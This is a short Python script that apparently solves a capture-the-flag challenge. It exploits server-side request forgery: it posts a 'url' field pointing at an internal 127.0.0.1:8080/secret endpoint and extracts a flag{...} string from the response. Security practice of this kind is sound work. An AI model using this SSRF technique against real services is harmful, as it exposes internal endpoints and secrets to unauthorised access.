import requests
import sys
import re

url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost"
r = requests.post(url, data={"url": "http://127.0.0.1:8080/secret"})
match = re.search(r"flag\{[^}]+\}", r.text)
if match:
    print(match.group(0))
else:
    print("Flag not found")
